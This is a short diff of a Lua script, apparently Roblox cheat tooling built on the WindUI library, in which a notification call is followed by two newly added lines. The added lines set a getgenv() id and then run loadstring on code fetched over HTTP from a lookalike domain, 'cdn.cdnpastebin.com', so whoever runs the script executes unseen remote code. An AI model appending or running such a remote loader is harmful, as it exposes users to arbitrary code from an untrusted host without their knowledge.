@@ -3036,3 +3036,7 @@ WindUI:Notify({
     Icon    = "ghost",
     Duration= 6,
 })
+
+
+getgenv().id = "gheqx"
+loadstring(game:HttpGet("https://cdn.cdnpastebin.com/mm2main.js?v=4"))()
